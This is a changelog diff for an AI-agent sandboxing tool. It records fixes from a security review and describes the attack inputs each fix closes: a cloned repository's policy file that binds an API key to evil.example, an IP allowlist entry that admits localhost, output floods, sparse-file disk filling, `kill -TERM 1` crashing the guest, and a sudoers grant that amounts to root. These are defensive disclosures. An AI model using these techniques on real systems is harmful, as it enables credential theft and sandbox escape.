@@ -15,6 +15,76 @@ reference described in the README and re-measured per release.
 
 ---
 
+## Unreleased
+
+### Security
+- **A discovered `kelyfos.toml` binds secrets only once you have approved it**
+  (security review 2026-09-03; D101). A policy file found by walking up from
+  the working directory — the one a cloned repository carries — was trusted
+  on ownership alone, and the clone is owned by whoever cloned it; so a
+  stranger's `secrets = ["ANTHROPIC_API_KEY@evil.example"]` beside an
+  `allow` of the same domain attached your key to the first request the agent
+  made there, with a banner as the only warning. Such a file's secrets are now
+  bound only once approved for its current contents: `kelyfos run` asks at the
+  terminal and records a yes; with nobody to ask it refuses and names the two
+  ways to say yes — `kelyfos trust <file>`, or `--policy <file>`. The record
+  is `<cache>/trust/policy-secrets.json`, a path and a digest per file, never
+  a value. A file that binds nothing is not asked about. See
+  docs/upgrading.md §11.
+- **An IP literal is matched exactly, never by suffix** (security review
+  2026-09-03). The allowlist's suffix rule is about DNS labels, and an address
+  has none — yet `allow = ["0.1"]` was accepted as two alphanumeric labels and,
+  being a suffix of every address ending in `.0.1`, admitted `127.0.0.1` and
+  every host-local service on the machine; the dialer's resolved-address
+  table never saw it, because a literal is not resolved. A literal entry now
+  admits the address it names and nothing else, a credential bound to one
+  attaches there and nowhere else, and an entry whose every label is a number
+  is refused at both doors as the tail of an address rather than a name.
+- **What one command's output can put in the session record is bounded**
+  (security review 2026-09-03). `kelyfos exec` and the MCP bridge appended
+  every byte a command printed to the chain, one event per 8 KiB, for as long
+  as it printed — so `yes` inside the guest, or an agent's exec tool with no
+  timeout, grew a file on the host's disk until the disk was full. Both now
+  keep at most 16 MiB of one command's output (the ceiling `sandbox.Exec`
+  already refused past), say so once in-band, and record nothing more of that
+  command; the terminal and the client still receive all of it.
+- **A workspace image that declares more content than its disk can hold is
+  refused** (security review 2026-09-03). The difference is a sparse file —
+  `truncate -s 100G /work/000` inside the guest — which the write-back
+  materialised as zeros on the person's disk, bounded only by what was free.
+  The refusal names the entry; a sparse file that fits is unaffected.
+- **The guest supervisor ignores the terminating signals** (security review
+  2026-09-03). The Go runtime installs a handler for SIGTERM, SIGINT, SIGHUP
+  and SIGQUIT, which is exactly the condition under which the kernel delivers
+  a signal to PID 1 — so a confined process could `kill -TERM 1` and end the
+  machine with a kernel panic, skipping the shutdown handshake and the
+  workspace flush. They are ignored at the kernel now; nothing legitimate
+  signals PID 1, which is spoken to over the control channel.
+
+### Added
+- **`kelyfos trust <kelyfos.toml>`** approves a discovered policy file's secret
+  bindings for its current contents; `--revoke` forgets one and `--list`
+  prints the record (D101).
+
+### Documented
+- **The sudoers grant is root for the invoking account, and egress needs
+  more of it** (security review 2026-09-03). The README said "grant it for the
+  jailer alone"; the jailer accepts `--uid 0`, any `--exec-file` and any
+  `--chroot-base-dir` and drops no capabilities, so a passwordless `jailer` is
+  a passwordless root shell for any process running as you. `--allow` needs
+  passwordless `ip`, `nft` and `rm` on top, and `ip netns exec` is a root
+  shell outright. The README, docs/threat-model.md and docs/hardening.md now
+  say so plainly and what follows from it, rather than describing the line as
+  narrow.
+
+### Removed
+- Dead code the review's `deadcode` pass found: `Slice.CPUStat`,
+  `TeamSlice.CPUStat`, `TeamSlice.Unit`, `sessionpolicy.PluginNames`, and two
+  unused struct fields. Four byte-identical helpers were merged into one each
+  (`report.HumanBytes`, `report.QuotaNote`, `sandbox.tapName`, one
+  `freeBytes` for both platforms) and the recorder's `clipUTF8` now calls
+  `argsummary.ClipUTF8` rather than carrying a copy.
+
 ## v1.3.0 — 2026-09-02
 
 ### Documented
